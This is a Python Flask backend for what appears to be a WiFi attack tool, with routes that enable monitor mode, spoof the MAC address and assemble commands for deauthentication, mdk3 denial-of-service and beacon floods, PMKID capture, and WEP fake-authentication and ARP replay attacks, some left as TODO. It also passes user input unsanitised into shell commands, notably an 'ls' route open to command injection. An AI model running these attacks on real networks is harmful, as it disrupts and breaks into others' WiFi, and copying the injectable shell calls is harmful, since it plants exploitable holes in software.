from markupsafe import escape
from werkzeug.utils import secure_filename
from flask import request, jsonify, make_response, session
from app import app, config
import subprocess

Essid = None

@app.get('/')
def index():
    return "OK"

@app.get('/netcard')
def getNetcardMon():
    bash_command = 'iwconfig 2>&1 | grep "ESSID" | while read netcard text; do echo "$netcard"; done'
    output = subprocess.run(bash_command, check=True, capture_output=True, text=True, shell=True)
    
    cards = output.stdout

    print(cards)
    return cards

@app.post('/netcard')
def setNetcardMon():
    netcard = escape(request.form['netcard'])
    netcardMon = netcard + "mon"
    session["netcardMon"] = netcardMon
    mac = f"{config['mac']['oui']}:12:8c:b6"
    session["mac"] = mac

    startMon = f'airmon-ng check kill && airmon-ng start {netcard}'
    subprocess.run(startMon, check=True, shell=True)

    changeMac = f'ifconfig {netcardMon} down &&  macchanger --mac={mac} {netcardMon} && ifconfig {netcardMon} up'
    subprocess.run(changeMac, check=True, shell=True)
    
    response_data = {"netcard": f"{netcardMon}", "mac": f"{mac}"}
    response_code = 200

    response = jsonify(response_data)
    response = make_response(response, response_code)

    return response

@app.get('/stop')
def stopNetcardMon():
    netcardMon = session.get("netcardMon") 
    startServices = f'airmon-ng stop {netcardMon} && systemctl start NetworkManager.service'

    subprocess.run(startServices, check=True, shell=True)
    return make_response(200)

@app.get('/scan')
def scan():
    netcardMon = session.get('netcardMon') 
    #TODO:Ejecutar en segundo plano (hilo)
    startScan = f'airodump-ng -w /tmp/WiFiGhost/dumpData --output-format csv {netcardMon}'
    #subprocess.run(startScan, check=True, shell=True)
    #TODO:Leer constantemenete la salida para mantener ese monitoreo y actualizar con websockets
    return make_response(200)

@app.post('/target')
def target():
    session['bssid'] = escape(request.form['bssid'])
    session['essid'] = escape(request.form['essid'])
    session['channel'] = escape(request.form['channel'])
    #TODO: Plantear target... aislado o conjunto??
    return make_response(200)

@app.post('/attack/<int:id>')
def attack(id):
    nPackets = escape(request.form['n'])
    netcardMon = session.get('netcardMon') 
    essid = session.get('essid')
    bssid = session.get('bssid')
    channel = session.get('channel')


    #TODO:Ejecutar en segundo plano y leer constantemenete su actividad para encontrar Handshake
    startScan = f'airodump-ng -w /tmp/WiFiGhost/dumpDataAttack --output-format csv {netcardMon} -e {essid} --channel {channel}'

    match id:
        #WPA/WPA2 With Clients
        case 0: #Deauthentication
            attack = f'aireplay-ng -0 {nPackets} -b {bssid} {netcardMon}'
            pass
        case 1: #Fake DoS Attack
            attack = f'mdk3 {netcardMon} a -a {bssid}'
            pass
        case 2: #Beacon Flood Mode Attack
            fakeNets = escape(request.form['fn'])
            attack = f'mdk3 {netcardMon} b -f {fakeNets} -a -s 1000 -c {channel}'
            pass
        case 3: #Disassociation Amok Mode Attack
            attack = f'mdk3 {netcardMon} d -w blacklist -c 1'
            pass
        case 4: #Michael Shutdown Explotation
            attack = f'mdk3 {netcardMon} m -t {bssid}'
            pass

        #WPA/WPA2 Without Clients
        case 5: #PMKID
            attack = f'hcxdumptool -i {netcardMon} -o captura --enable_status=1'
            extract = f'hcxpcaptool -z hashes captura'
            pass

        #WPS
        case 6: #TODO
            attack = f''
            pass

        #WEP
        case 7: #Fake Authentication Attack
            attack = f'aireplay-ng -1 0 -a {bssid} -h {session["mac"]} {netcardMon} && aireplay-ng -2 -p 0841 -b {bssid} -h {session["mac"]} {netcardMon}'
            pass
        case 8: #ARP Replay Attack
            attack = f'aireplay-ng -b {bssid} -3 -n {nPackets} -x 1000 -h {session["mac"]} {netcardMon}'
            pass
 
    
    #TODO:ejecutar en un hilo y esperar su finalizacion
    #subprocess.run(attack, check=True, shell=True)
    
    #Leer csv y buscar handshake
    return make_response(200)


@app.post('/list/<string:list>')
def setWordlist(list):
    f = request.files['file']
    f.save(f'{list}/{secure_filename(f.filename)}')
    
    return make_response(f"saved on {list}/{secure_filename(f.filename)}")

@app.get('/list/<string:list>')
def getWordlists(list):
    ls = f'ls {list}'
    output = subprocess.run(ls, check=True, capture_output=True, text=True, shell=True)
    
    ls = output.stdout

    response_data = {"ls": f"{ls}"}
    response_code = 200

    response = jsonify(response_data)
    response = make_response(response, response_code)

    return ls

